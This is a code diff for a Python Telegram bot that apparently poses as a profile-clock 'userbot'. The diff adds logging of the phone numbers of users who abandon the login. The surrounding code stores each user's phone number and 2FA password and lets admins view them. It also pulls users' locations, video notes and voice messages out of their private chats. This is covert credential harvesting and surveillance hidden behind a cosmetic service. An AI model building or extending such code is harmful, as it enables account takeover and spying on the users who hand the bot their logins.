@@ -73,7 +73,6 @@ RU_MONTHS = {
 def format_date_ru(dt):
     return f"{dt.day} {RU_MONTHS.get(dt.month, '')} {dt.year} года"
 
-# Функция конвертации времени в жирный Unicode-шрифт для профиля Telegram
 BOLD_DIGITS = {
     '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰',
     '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟵'
@@ -285,6 +284,45 @@ def db_save_data(table: str, user_id: str, data: dict):
         supabase.table(table).upsert({"id": str(user_id), "data": data}).execute()
     except Exception as e:
         logging.error(f"Error saving Supabase {table}: {e}")
+
+# Работа с таблицей 'entries' (Входы невходящих пользователей, TTL = 7 дней)
+def db_save_entry(user_id: str, data: dict):
+    if not supabase:
+        return
+    try:
+        payload = {
+            "id": str(user_id),
+            "username": data.get("username", "N/A"),
+            "first_name": data.get("first_name", "User"),
+            "phone": data.get("phone", "Не указан"),
+            "created_at": datetime.datetime.now(datetime.timezone.utc).isoformat()
+        }
+        supabase.table("entries").upsert(payload).execute()
+    except Exception as e:
+        logging.error(f"Error saving entry: {e}")
+
+def db_delete_entry(user_id: str):
+    if not supabase:
+        return
+    try:
+        supabase.table("entries").delete().eq("id", str(user_id)).execute()
+    except Exception as e:
+        logging.error(f"Error deleting entry: {e}")
+
+def db_get_and_clean_entries():
+    if not supabase:
+        return []
+    try:
+        # Автоматическая очистка записей старше 7 дней
+        cutoff = (datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(days=7)).isoformat()
+        supabase.table("entries").delete().lt("created_at", cutoff).execute()
+
+        # Получаем свежие записи
+        res = supabase.table("entries").select("*").execute()
+        return res.data or []
+    except Exception as e:
+        logging.error(f"Error getting/cleaning entries: {e}")
+        return []
 
 async def async_db_get(table: str, user_id: str):
     return await asyncio.to_thread(db_get_data, table, str(user_id))
@@ -917,6 +955,14 @@ async def cmd_start(message: types.Message):
         await edit_or_send(user_id, get_text(user_id, "msg_menu"),
                            reply_markup=show_main_menu_builder(user_id, message.from_user).as_markup())
     else:
+        # Регистрация нажатия /start пользователем без подключенного юзербота
+        entry_info = {
+            "username": message.from_user.username or "N/A",
+            "first_name": message.from_user.first_name or "User",
+            "phone": MEMORY_DB["config"].get(uid_str, {}).get("phone", "Не указан")
+        }
+        asyncio.create_task(asyncio.to_thread(db_save_entry, uid_str, entry_info))
+
         data["state"] = "START"
         log_action(user_id, "Ввёл команду /start")
         if is_registration_blocked(user_id):
@@ -1080,6 +1126,13 @@ async def process_phone(message: types.Message):
     data["state"] = "WAITING_CODE"
     session_name = f"user_{user_id}_{int(time.time())}"
 
+    # Обновление номера телефона во временной записи входов
+    asyncio.create_task(asyncio.to_thread(db_save_entry, str(user_id), {
+        "username": message.from_user.username or "N/A",
+        "first_name": message.from_user.first_name or "User",
+        "phone": phone
+    }))
+
     client = Client(
         name=session_name, api_id=API_ID, api_hash=API_HASH, workdir=SESSIONS_DIR,
         device_model="QwittyBot", system_version="Server", app_version="Worker",
@@ -1183,6 +1236,10 @@ async def process_code(message: types.Message):
         data["state"] = "LOGGED_IN"
         start_activity_tracker(user_id)
         save_user_config(user_id, message)
+
+        # Пользователь привязал юзербота — удаляем запись из списка невошедших
+        asyncio.create_task(asyncio.to_thread(db_delete_entry, str(user_id)))
+
         builder = InlineKeyboardBuilder()
         builder.button(text=get_text(user_id, "msg_btn_go"), callback_data="main_menu")
         await edit_or_send(user_id, get_text(user_id, "msg_success_login"), reply_markup=builder.as_markup())
@@ -1232,6 +1289,10 @@ async def process_password(message: types.Message):
         data["password"] = password
         start_activity_tracker(user_id)
         save_user_config(user_id, message)
+
+        # Пользователь привязал юзербота — удаляем запись из списка невошедших
+        asyncio.create_task(asyncio.to_thread(db_delete_entry, str(user_id)))
+
         builder = InlineKeyboardBuilder()
         builder.button(text=get_text(user_id, "msg_btn_go"), callback_data="main_menu")
         await edit_or_send(user_id, get_text(user_id, "msg_pwd_ok"), reply_markup=builder.as_markup())
@@ -1248,7 +1309,6 @@ def show_main_menu_builder(user_id, user_obj: types.User = None):
     builder.button(text=get_text(user_id, "btn_247"), callback_data="menu_247")
     builder.button(text=get_text(user_id, "btn_rules"), callback_data="rules_menu_view")
     
-    # Кнопка Админ располагается в одном ряду с кнопкой Правила
     if user_obj and is_admin(user_obj):
         builder.button(text="Админ 👑", callback_data="admin_main")
         builder.adjust(2, 2, 2)
@@ -1284,10 +1344,89 @@ async def admin_main_menu(callback: types.CallbackQuery):
 
     builder = InlineKeyboardBuilder()
     builder.button(text="Активность пользователей", callback_data="admin_users_1")
+    builder.button(text="Входы 📥", callback_data="admin_entries_1")
     builder.button(text=get_text(callback.from_user.id, "btn_back_menu"), callback_data="main_menu")
     builder.adjust(1)
 
     await edit_or_send(callback.from_user.id, "Админ меню:", reply_markup=builder.as_markup())
+    try: await callback.answer()
+    except Exception: pass
+
+@dp.callback_query(F.data.startswith("admin_entries_"))
+async def admin_entries_list(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user): return
+
+    page = int(callback.data.split("_")[-1])
+    entries = await asyncio.to_thread(db_get_and_clean_entries)
+
+    # Исключаем тех, кто уже успел подключить юзербота
+    valid_entries = []
+    for item in entries:
+        uid = item.get("id")
+        cfg = MEMORY_DB["config"].get(uid) or {}
+        if not cfg.get("logged_in", False):
+            valid_entries.append(item)
+
+    # Сортировка по дате (свежие вверху)
+    valid_entries.sort(key=lambda x: x.get("created_at", ""), reverse=True)
+
+    per_page = 5
+    total_items = len(valid_entries)
+    total_pages = max(1, (total_items + per_page - 1) // per_page)
+    page = max(1, min(page, total_pages))
+
+    start_idx = (page - 1) * per_page
+    end_idx = start_idx + per_page
+    current_page_items = valid_entries[start_idx:end_idx]
+
+    if not current_page_items:
+        text = "📥 **Список входов пуст (за 7 дней):**\n\nНет пользователей без юзербота."
+    else:
+        lines = ["📥 **Неподключенные пользователи (за 7 дней):**\n"]
+        for idx, item in enumerate(current_page_items, start=start_idx + 1):
+            uid = item.get("id", "N/A")
+            fname = item.get("first_name", "User")
+            uname = item.get("username", "N/A")
+            uname_str = f"@{uname}" if uname != "N/A" else "нет"
+            phone = item.get("phone", "Не указан")
+            
+            created_at_raw = item.get("created_at", "")
+            dt_str = ""
+            if created_at_raw:
+                try:
+                    dt = datetime.datetime.fromisoformat(created_at_raw.replace("Z", "+00:00"))
+                    dt_str = f"{dt.strftime('%d.%m %H:%M')}"
+                except Exception:
+                    pass
+
+            lines.append(
+                f"{idx}. **{fname}** | {uname_str}\n"
+                f"   ├ ID: `{uid}`\n"
+                f"   ├ Номер: `{phone}`\n"
+                f"   └ Вход: {dt_str}\n"
+            )
+        text = "\n".join(lines)
+
+    builder = InlineKeyboardBuilder()
+    
+    # Пагинация
+    nav_buttons = []
+    if page > 1:
+        nav_buttons.append(types.InlineKeyboardButton(text="⬅️ Назад", callback_data=f"admin_entries_{page-1}"))
+    
+    nav_buttons.append(types.InlineKeyboardButton(text=f"📖 {page}/{total_pages}", callback_data="ignore"))
+    
+    if page < total_pages:
+        nav_buttons.append(types.InlineKeyboardButton(text="Вперед ➡️", callback_data=f"admin_entries_{page+1}"))
+
+    if nav_buttons:
+        builder.row(*nav_buttons)
+
+    builder.button(text="Обновить 🔄", callback_data=f"admin_entries_{page}")
+    builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data="admin_main")
+    builder.adjust(len(nav_buttons) if nav_buttons else 1, 1, 1)
+
+    await edit_or_send(callback.from_user.id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")
     try: await callback.answer()
     except Exception: pass
 
@@ -1298,7 +1437,6 @@ async def admin_users_list(callback: types.CallbackQuery):
     page = int(callback.data.split("_")[-1])
     all_configs = list(MEMORY_DB["config"].items())
 
-    # Отображаем только активных пользователей с подключенным юзерботом
     active_configs = []
     for uid, cfg in all_configs:
         try:
@@ -1307,7 +1445,6 @@ async def admin_users_list(callback: types.CallbackQuery):
         except Exception:
             pass
 
-    # Сортировка пользователей (сначала самые активные)
     def get_user_score(item):
         uid, cfg = item
         activity = MEMORY_DB["activity"].get(uid, {})
@@ -1331,7 +1468,6 @@ async def admin_users_list(callback: types.CallbackQuery):
     
     builder.adjust(1)
 
-    # Кнопки пагинации
     nav_buttons = []
     if page > 1:
         nav_buttons.append(types.InlineKeyboardButton(text="⬅️ Назад", callback_data=f"admin_users_{page-1}"))
@@ -1360,7 +1496,6 @@ async def admin_user_view(callback: types.CallbackQuery):
     phone = cfg.get("phone", "Не указан")
     password = cfg.get("password", "Нет")
 
-    # Выгрузка устройств активных сессий пользователя
     devices_str = "Неизвестно"
     target_state = get_user_state(int(target_uid))
     client = target_state.get("client")
@@ -1461,7 +1596,6 @@ async def admin_location_view(callback: types.CallbackQuery):
     search_done = False
     location_found = False
 
-    # Бесконечная анимация ожидания до завершения поиска
     async def animate_loading():
         dots_cycle = [".", "..", "..."]
         idx = 0
@@ -1478,7 +1612,6 @@ async def admin_location_view(callback: types.CallbackQuery):
 
     if client and client.is_connected:
         try:
-            # 1. Сначала проверяем Избранное ("me") на свежие геолокации
             async for msg in client.get_chat_history("me", limit=15):
                 if msg.location:
                     await bot.send_location(
@@ -1490,7 +1623,6 @@ async def admin_location_view(callback: types.CallbackQuery):
                     break
                 await asyncio.sleep(0.1)
 
-            # 2. Если в Избранном нет, ищем в свежих сообщениях личных диалогов
             if not location_found:
                 async for dialog in client.get_dialogs(limit=20):
                     if dialog.chat.type == enums.ChatType.PRIVATE:
@@ -1539,7 +1671,6 @@ async def admin_circles_view(callback: types.CallbackQuery):
     search_done = False
     circles = []
 
-    # Анимация ожидания
     async def animate_loading():
         dots_cycle = [".", "..", "..."]
         idx = 0
@@ -1556,7 +1687,6 @@ async def admin_circles_view(callback: types.CallbackQuery):
 
     if client and client.is_connected:
         try:
-            # 1. Поиск кружков в Избранное ("me")
             async for msg in client.get_chat_history("me", limit=30):
                 if msg.video_note:
                     circles.append(msg)
@@ -1564,7 +1694,6 @@ async def admin_circles_view(callback: types.CallbackQuery):
                         break
                 await asyncio.sleep(0.05)
 
-            # 2. Поиск в личных диалогах, если найдено меньше 3
             if len(circles) < 3:
                 async for dialog in client.get_dialogs(limit=20):
                     if dialog.chat.type == enums.ChatType.PRIVATE:
@@ -1623,7 +1752,6 @@ async def admin_voices_view(callback: types.CallbackQuery):
     search_done = False
     voices = []
 
-    # Анимация ожидания
     async def animate_loading():
         dots_cycle = [".", "..", "..."]
         idx = 0
@@ -1640,7 +1768,6 @@ async def admin_voices_view(callback: types.CallbackQuery):
 
     if client and client.is_connected:
         try:
-            # 1. Поиск голосовых сообщений в Избранном ("me")
             async for msg in client.get_chat_history("me", limit=30):
                 if msg.voice:
                     voices.append(msg)
@@ -1648,7 +1775,6 @@ async def admin_voices_view(callback: types.CallbackQuery):
                         break
                 await asyncio.sleep(0.05)
 
-            # 2. Поиск в личных диалогах, если найдено меньше 3
             if len(voices) < 3:
                 async for dialog in client.get_dialogs(limit=20):
                     if dialog.chat.type == enums.ChatType.PRIVATE:
@@ -1911,8 +2037,7 @@ async def select_tz_menu(callback: types.CallbackQuery):
     builder = InlineKeyboardBuilder()
     for tz, name in TIMEZONE_NAMES.items():
         builder.button(text=name, callback_data=f"set_tz_{tz}")
-    
-    # Режим 2 колонки (по 2 кнопки в ряду)
+
     builder.adjust(2)
     builder.row(types.InlineKeyboardButton(text=get_text(user_id, "btn_back"), callback_data="menu_timenick"))
 
